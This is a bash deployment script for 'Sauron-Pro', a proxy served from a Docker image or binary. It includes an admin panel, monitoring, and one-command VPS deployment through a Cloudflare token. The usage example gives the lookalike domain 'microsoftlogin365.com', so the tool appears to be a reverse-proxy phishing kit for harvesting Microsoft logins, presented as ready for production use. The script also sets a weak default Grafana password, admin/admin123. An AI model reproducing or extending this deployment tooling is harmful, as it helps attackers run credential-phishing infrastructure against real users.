#!/bin/bash
set -e

# Sauron-Pro Production Deployment Script
# This script deploys Sauron-Pro in production with enterprise features

echo "🏢 Sauron-Pro Production Deployment"
echo "======================================"

DEPLOYMENT_METHOD="$1"
VERSION="v2.0.0-pro"

if [ -z "$DEPLOYMENT_METHOD" ]; then
    echo ""
    echo "🚀 Available Deployment Methods:"
    echo ""
    echo "1. Binary Deployment (Standalone)"
    echo "   ./deploy-production.sh binary"
    echo "   ✅ Fast deployment, systemd integration"
    echo "   ✅ Lower resource usage"
    echo "   ❌ Manual dependency management"
    echo ""
    echo "2. Docker Deployment (Containerized)"
    echo "   ./deploy-production.sh docker"
    echo "   ✅ Isolated environment, easy scaling"
    echo "   ✅ Includes Redis, monitoring stack"
    echo "   ❌ Requires Docker knowledge"
    echo ""
    echo "3. Auto Deployment (VPS)"
    echo "   ./deploy-production.sh auto <VPS_IP> <DOMAIN> <CF_TOKEN>"
    echo "   ✅ Fully automated deployment"
    echo "   ✅ Zero-touch installation"
    echo ""
    exit 1
fi

case "$DEPLOYMENT_METHOD" in
    "binary")
        echo "📦 Deploying Sauron-Pro Binary Release..."
        
        # Check if release exists
        if [ ! -f "release-$VERSION/sauron-$VERSION-linux-amd64.tar.gz" ]; then
            echo "🔨 Building binary release..."
            ./scripts/build-release.sh "$VERSION"
        fi
        
        echo "✅ Binary release ready!"
        echo "📁 Location: release-$VERSION/"
        echo ""
        echo "🚀 Next Steps:"
        echo "1. Upload to VPS: scp -r release-$VERSION/ root@your-vps:/tmp/"
        echo "2. SSH to VPS: ssh root@your-vps"
        echo "3. Extract: cd /tmp && tar -xzf release-$VERSION/sauron-$VERSION-linux-amd64.tar.gz"
        echo "4. Install: cd sauron && sudo ./install-production.sh"
        ;;
        
    "docker")
        echo "🐳 Deploying Sauron-Pro Docker Release..."
        
        # Check if Docker image exists
        if ! docker image inspect sauron-proxy:$VERSION >/dev/null 2>&1; then
            echo "🔨 Building Docker image..."
            ./scripts/build-docker-release.sh "$VERSION"
        fi
        
        # Check for .env file
        if [ ! -f ".env" ]; then
            echo "⚠️ Creating .env from example..."
            cp .env.example .env
            echo "📝 Please edit .env file with your configuration"
            echo "⏸️ Deployment paused. Run again after configuring .env"
            exit 1
        fi
        
        echo "🚀 Starting Sauron-Pro with Docker Compose..."
        docker-compose -f docker-compose.pro.yml up -d
        
        echo "✅ Sauron-Pro deployed successfully!"
        echo "🔍 Check status: docker-compose -f docker-compose.pro.yml ps"
        echo "📋 View logs: docker-compose -f docker-compose.pro.yml logs -f sauron-pro"
        echo "🌐 Admin panel: https://$(grep SAURON_DOMAIN .env | cut -d'=' -f2)/admin"
        ;;
        
    "auto")
        VPS_IP="$2"
        DOMAIN="$3"
        CF_TOKEN="$4"
        
        if [ -z "$VPS_IP" ] || [ -z "$DOMAIN" ] || [ -z "$CF_TOKEN" ]; then
            echo "❌ Usage: $0 auto <VPS_IP> <DOMAIN> <CLOUDFLARE_TOKEN>"
            echo ""
            echo "Example:"
            echo "  $0 auto 192.168.1.100 microsoftlogin365.com your_cf_token_here"
            exit 1
        fi
        
        echo "🤖 Starting automated deployment..."
        echo "📊 Target VPS: $VPS_IP"
        echo "🌐 Domain: $DOMAIN"
        echo "🔐 Cloudflare Token: ${CF_TOKEN:0:8}..."
        
        # Use existing auto-deploy script with Pro version
        ./scripts/auto-deploy.sh "$VPS_IP" "$DOMAIN" "$CF_TOKEN"
        ;;
        
    "monitoring")
        echo "📊 Deploying Monitoring Stack..."
        
        if [ ! -f ".env" ]; then
            echo "❌ .env file required for monitoring deployment"
            exit 1
        fi
        
        # Create monitoring configuration
        mkdir -p monitoring
        cat > monitoring/prometheus.yml << 'PROM_EOF'
global:
  scrape_interval: 15s

scrape_configs:
  - job_name: 'sauron-pro'
    static_configs:
      - targets: ['sauron-pro:8080']
    metrics_path: '/metrics'
    scrape_interval: 10s
PROM_EOF
        
        echo "🚀 Starting monitoring stack..."
        docker-compose -f docker-compose.pro.yml --profile monitoring up -d
        
        echo "✅ Monitoring deployed!"
        echo "📊 Prometheus: http://localhost:9090"
        echo "📈 Grafana: http://localhost:3000 (admin/admin123)"
        ;;
        
    "status")
        echo "🔍 Checking Sauron-Pro Status..."
        
        # Check Docker deployment
        if docker-compose -f docker-compose.pro.yml ps >/dev/null 2>&1; then
            echo "🐳 Docker Deployment Status:"
            docker-compose -f docker-compose.pro.yml ps
            echo ""
        fi
        
        # Check binary deployment
        if systemctl is-active sauron >/dev/null 2>&1; then
            echo "📦 Binary Deployment Status:"
            systemctl status sauron --no-pager
            echo ""
        fi
        
        # Check ports
        echo "🔌 Port Status:"
        netstat -tlnp | grep -E ":(80|443|53|9090|3000)\s" || echo "No services detected on standard ports"
        ;;
        
    "stop")
        echo "⏹️ Stopping Sauron-Pro..."
        
        # Stop Docker deployment
        if docker-compose -f docker-compose.pro.yml ps >/dev/null 2>&1; then
            echo "🐳 Stopping Docker services..."
            docker-compose -f docker-compose.pro.yml down
        fi
        
        # Stop binary deployment
        if systemctl is-active sauron >/dev/null 2>&1; then
            echo "📦 Stopping binary service..."
            sudo systemctl stop sauron
        fi
        
        echo "✅ Sauron-Pro stopped"
        ;;
        
    "clean")
        echo "🧹 Cleaning Sauron-Pro deployment..."
        
        read -p "⚠️ This will remove ALL data. Are you sure? (y/N): " confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            # Clean Docker
            docker-compose -f docker-compose.pro.yml down -v
            docker image rm sauron-proxy:$VERSION 2>/dev/null || true
            
            # Clean binary
            sudo systemctl stop sauron 2>/dev/null || true
            sudo systemctl disable sauron 2>/dev/null || true
            sudo rm -f /etc/systemd/system/sauron.service
            sudo rm -f /usr/local/bin/sauron
            
            echo "✅ Cleanup complete"
        else
            echo "❌ Cleanup cancelled"
        fi
        ;;
        
    *)
        echo "❌ Unknown deployment method: $DEPLOYMENT_METHOD"
        echo "📖 Use: $0 (no arguments) to see available methods"
        exit 1
        ;;
esac
